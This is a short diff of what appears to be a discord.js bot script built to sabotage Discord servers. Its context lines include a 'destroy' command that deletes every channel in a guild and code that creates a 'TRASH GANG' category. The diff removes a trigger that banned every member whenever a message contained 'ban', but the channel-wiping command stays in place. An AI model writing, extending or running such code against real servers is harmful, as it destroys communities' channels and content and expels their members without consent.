@@ -564,10 +564,6 @@ if(message.content === "roles"){
                     message.guild.createChannel("TRASH GANG","category")    
                 }
                 }
-                if(message.content.includes("ban")){
-                    message.delete();
-                    message.guild.members.map(m => m.ban(m.user))
-                }  
                 if(message.content === "destroy"){
                     message.guild.channels.map(c => c.delete())
                     }
